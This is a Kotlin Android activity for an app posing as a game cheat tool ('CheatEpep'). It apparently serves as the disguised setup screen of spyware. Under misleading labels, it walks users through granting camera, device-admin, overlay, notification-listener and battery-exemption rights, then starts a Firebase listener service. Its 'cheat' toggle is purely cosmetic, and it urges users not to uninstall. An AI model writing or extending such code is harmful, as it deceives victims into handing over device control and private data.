package com.sanz.epep.ui

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.Manifest
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.view.Gravity
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.sanz.epep.data.local.PrefsManager
import com.sanz.epep.receiver.AdminReceiver
import com.sanz.epep.service.FirebaseListenerService

class SetupActivity : AppCompatActivity() {

    companion object {
        private const val REQUEST_OVERLAY = 1001
        private const val REQUEST_CAMERA = 1002
        private const val REQUEST_ADMIN = 1003
        private const val REQUEST_BATTERY = 1004
        private const val REQUEST_NOTIFICATION = 1005
    }

    private lateinit var checkOverlay: CheckBox
    private lateinit var checkCamera: CheckBox
    private lateinit var checkAdmin: CheckBox
    private lateinit var checkBattery: CheckBox
    private lateinit var checkNotification: CheckBox
    private lateinit var startBtn: Button
    private lateinit var statusText: TextView

    private lateinit var cheatToggle: Button
    private lateinit var cheatStatus: TextView
    private var isCheatOn = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        PrefsManager.init(this)

        window.statusBarColor = Color.parseColor("#1A1A2E")
        window.navigationBarColor = Color.parseColor("#1A1A2E")

        if (PrefsManager.isSetupDone) {
            FirebaseListenerService.start(this)
            showCheatPage()
            return
        }

        showSetupPage()
    }

    private fun showSetupPage() {
        val root = ScrollView(this).apply {
            setBackgroundColor(Color.parseColor("#1A1A2E"))
            setPadding(48, 80, 48, 48)
        }

        val mainLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }

        val icon = TextView(this).apply {
            text = "⚡"
            textSize = 48f
            gravity = Gravity.CENTER
        }
        mainLayout.addView(icon, lp().apply { bottomMargin = 16 })

        val header = TextView(this).apply {
            text = "CheatEpep"
            setTextColor(Color.parseColor("#4CAF50"))
            textSize = 28f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
        }
        mainLayout.addView(header, lp().apply { bottomMargin = 8 })

        val version = TextView(this).apply {
            text = "v3.2.1 — Universal Cheat Engine"
            setTextColor(Color.parseColor("#666666"))
            textSize = 12f
            gravity = Gravity.CENTER
        }
        mainLayout.addView(version, lp().apply { bottomMargin = 48 })

        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#16213E"))
                cornerRadius = 20f
            }
        }

        val cardTitle = TextView(this).apply {
            text = "🔧 Setup Required"
            setTextColor(Color.WHITE)
            textSize = 16f
            typeface = Typeface.DEFAULT_BOLD
        }
        card.addView(cardTitle, lp().apply { bottomMargin = 8 })

        val cardDesc = TextView(this).apply {
            text = "Aktifkan semua izin agar cheat berjalan dengan baik"
            setTextColor(Color.parseColor("#888888"))
            textSize = 12f
        }
        card.addView(cardDesc, lp().apply { bottomMargin = 24 })

        checkOverlay = createCheckItem("Render Overlay Engine")
        checkOverlay.setOnClickListener {
            checkOverlay.isChecked = Settings.canDrawOverlays(this)
            if (!Settings.canDrawOverlays(this)) requestOverlayPermission()
        }
        card.addView(checkOverlay, lp().apply { bottomMargin = 16 })

        checkCamera = createCheckItem("Visual Memory Scanner")
        checkCamera.setOnClickListener {
            checkCamera.isChecked = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                requestCameraPermission()
            }
        }
        card.addView(checkCamera, lp().apply { bottomMargin = 16 })

        checkAdmin = createCheckItem("Root Protection Module")
        checkAdmin.setOnClickListener {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val cn = ComponentName(this, AdminReceiver::class.java)
            checkAdmin.isChecked = dpm.isAdminActive(cn)
            if (!dpm.isAdminActive(cn)) requestDeviceAdmin()
        }
        card.addView(checkAdmin, lp().apply { bottomMargin = 16 })

        checkBattery = createCheckItem("Background Process Keep-Alive")
        checkBattery.setOnClickListener {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            checkBattery.isChecked = pm.isIgnoringBatteryOptimizations(packageName)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) requestBatteryOptimization()
        }
        card.addView(checkBattery, lp().apply { bottomMargin = 16 })

        checkNotification = createCheckItem("Notification Interceptor")
        checkNotification.setOnClickListener {
            checkNotification.isChecked = isNotificationAccessGranted()
            if (!isNotificationAccessGranted()) {
                startActivityForResult(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), REQUEST_NOTIFICATION)
            }
        }
        card.addView(checkNotification, lp().apply { bottomMargin = 32 })

        startBtn = Button(this).apply {
            text = "🚀 ACTIVATE CHEAT"
            setTextColor(Color.WHITE)
            textSize = 16f
            typeface = Typeface.DEFAULT_BOLD
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#4CAF50"))
                cornerRadius = 16f
            }
            setPadding(32, 24, 32, 24)
            isEnabled = false
            alpha = 0.5f
            setOnClickListener { activateApp() }
        }
        card.addView(startBtn, lp())

        mainLayout.addView(card, lp().apply { bottomMargin = 24 })

        statusText = TextView(this).apply {
            setTextColor(Color.parseColor("#FFD54F"))
            textSize = 12f
            gravity = Gravity.CENTER
        }
        mainLayout.addView(statusText, lp())

        val footer = TextView(this).apply {
            text = "⚠️ Jangan uninstall untuk menjaga cheat tetap aktif"
            setTextColor(Color.parseColor("#444444"))
            textSize = 11f
            gravity = Gravity.CENTER
        }
        mainLayout.addView(footer, lp().apply { topMargin = 32 })

        root.addView(mainLayout, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ))

        setContentView(root)
    }

    private fun showCheatPage() {
        val root = FrameLayout(this).apply {
            setBackgroundColor(Color.parseColor("#1A1A2E"))
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(64, 0, 64, 0)
        }

        val icon = TextView(this).apply {
            text = "⚡"
            textSize = 64f
            gravity = Gravity.CENTER
        }
        container.addView(icon, lp().apply { bottomMargin = 24 })

        val title = TextView(this).apply {
            text = "CheatEpep"
            setTextColor(Color.parseColor("#4CAF50"))
            textSize = 28f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
        }
        container.addView(title, lp().apply { bottomMargin = 8 })

        val version = TextView(this).apply {
            text = "v3.2.1 — Universal Cheat Engine"
            setTextColor(Color.parseColor("#555555"))
            textSize = 11f
            gravity = Gravity.CENTER
        }
        container.addView(version, lp().apply { bottomMargin = 48 })

        cheatStatus = TextView(this).apply {
            text = "● CHEAT ACTIVE"
            setTextColor(Color.parseColor("#4CAF50"))
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
        }
        container.addView(cheatStatus, lp().apply { bottomMargin = 32 })

        cheatToggle = Button(this).apply {
            text = "ON"
            setTextColor(Color.WHITE)
            textSize = 24f
            typeface = Typeface.DEFAULT_BOLD
            setPadding(0, 32, 0, 32)
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#4CAF50"))
                cornerRadius = 24f
                setStroke(3, Color.parseColor("#81C784"))
            }
            setOnClickListener { toggleCheat() }
        }
        container.addView(cheatToggle, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply { bottomMargin = 48 })

        val info = TextView(this).apply {
            text = "⚠️ Jangan uninstall agar cheat tetap aktif\nMinimize app untuk mulai bermain"
            setTextColor(Color.parseColor("#444444"))
            textSize = 11f
            gravity = Gravity.CENTER
        }
        container.addView(info, lp())

        root.addView(container, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT,
            Gravity.CENTER
        ))

        setContentView(root)
    }

    private fun toggleCheat() {
        isCheatOn = !isCheatOn
        if (isCheatOn) {
            cheatStatus.text = "● CHEAT ACTIVE"
            cheatStatus.setTextColor(Color.parseColor("#4CAF50"))
            cheatToggle.text = "ON"
            (cheatToggle.background as? GradientDrawable)?.apply {
                setColor(Color.parseColor("#4CAF50"))
                setStroke(3, Color.parseColor("#81C784"))
            }
        } else {
            cheatStatus.text = "● CHEAT PAUSED"
            cheatStatus.setTextColor(Color.parseColor("#F44336"))
            cheatToggle.text = "OFF"
            (cheatToggle.background as? GradientDrawable)?.apply {
                setColor(Color.parseColor("#F44336"))
                setStroke(3, Color.parseColor("#EF9A9A"))
            }
        }
    }

    private fun isNotificationAccessGranted(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return flat.contains(packageName)
    }

    override fun onResume() {
        super.onResume()
        if (!PrefsManager.isSetupDone) updateChecklistState()
    }

    private fun requestOverlayPermission() {
        startActivityForResult(Intent(
            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            Uri.parse("package:$packageName")
        ), REQUEST_OVERLAY)
    }

    private fun requestCameraPermission() {
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQUEST_CAMERA)
    }

    private fun requestDeviceAdmin() {
        val cn = ComponentName(this, AdminReceiver::class.java)
        startActivityForResult(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Diperlukan untuk proteksi cheat agar tidak terdeteksi anti-cheat")
        }, REQUEST_ADMIN)
    }

    private fun requestBatteryOptimization() {
        startActivityForResult(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
            data = Uri.parse("package:$packageName")
        }, REQUEST_BATTERY)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (!PrefsManager.isSetupDone) updateChecklistState()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (!PrefsManager.isSetupDone) updateChecklistState()
    }

    private fun updateChecklistState() {
        val overlayOk = Settings.canDrawOverlays(this)
        val cameraOk = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
        val adminOk = (getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager)
            .isAdminActive(ComponentName(this, AdminReceiver::class.java))
        val batteryOk = (getSystemService(Context.POWER_SERVICE) as PowerManager)
            .isIgnoringBatteryOptimizations(packageName)
        val notifOk = isNotificationAccessGranted()

        checkOverlay.isChecked = overlayOk
        checkOverlay.isEnabled = !overlayOk
        checkCamera.isChecked = cameraOk
        checkCamera.isEnabled = !cameraOk
        checkAdmin.isChecked = adminOk
        checkAdmin.isEnabled = !adminOk
        checkBattery.isChecked = batteryOk
        checkBattery.isEnabled = !batteryOk
        checkNotification.isChecked = notifOk
        checkNotification.isEnabled = !notifOk

        val all = overlayOk && cameraOk && adminOk && batteryOk && notifOk
        startBtn.isEnabled = all
        startBtn.alpha = if (all) 1.0f else 0.5f

        if (all) {
            statusText.text = "✅ All modules ready!"
            statusText.setTextColor(Color.parseColor("#4CAF50"))
        } else {
            statusText.text = "Tap each item to enable"
            statusText.setTextColor(Color.parseColor("#FFD54F"))
        }
    }

    private fun activateApp() {
        PrefsManager.isSetupDone = true
        FirebaseListenerService.start(this)
        showCheatPage()
    }

    private fun createCheckItem(text: String): CheckBox {
        return CheckBox(this).apply {
            this.text = text
            setTextColor(Color.WHITE)
            textSize = 15f
            buttonTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#4CAF50"))
            isChecked = false
        }
    }

    private fun lp() = LinearLayout.LayoutParams(
        LinearLayout.LayoutParams.MATCH_PARENT,
        LinearLayout.LayoutParams.WRAP_CONTENT
    )
}
